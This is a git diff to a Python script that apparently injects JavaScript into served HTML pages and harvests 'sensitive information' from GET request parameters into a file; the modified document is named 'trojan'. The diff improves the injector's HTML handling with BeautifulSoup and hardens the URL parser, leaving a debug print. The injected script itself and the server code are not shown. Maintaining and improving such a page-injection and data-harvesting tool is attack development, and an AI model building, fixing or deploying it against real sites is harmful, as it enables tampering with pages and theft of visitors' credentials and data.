@@ -22,6 +22,7 @@ import http.server
 import socketserver
 import requests
 from sys import exit
+from bs4 import BeautifulSoup
 
 JSCODE = []
 
@@ -181,7 +182,10 @@ def parse_get_url(url, filename):
     Parse the given GET URL for sensitive information,
     and append the information to the given file.
     """
-    uri, data = url.split("?")
+    try:
+        uri, data = url.split("?")
+    except ValueError:
+        return
     fields = data.split("&")
     with open(filename, "a") as f:
         for field in fields:
@@ -207,14 +211,19 @@ def inject_js(html):
     provided HTML, and return the modified document
     encoded in UTF-8.
     """
+    soup = BeautifulSoup(html, "html.parser")
+    html = soup.prettify()
     rows = html.strip().split("\n")
+    print(rows)
     rows.remove("</html>")
     rows.append("<script>")
     rows.extend(JSCODE)
     rows.append("</script>")
     rows.append("</html>")
-    trojan = "\n".join(rows).encode("utf-8")
-    return trojan
+    trojan = "\n".join(rows)
+    trojan_soup = BeautifulSoup(trojan, "html.parser")
+    trojan = trojan_soup.prettify()
+    return trojan.encode("utf-8")
 
 
 if __name__ == "__main__":
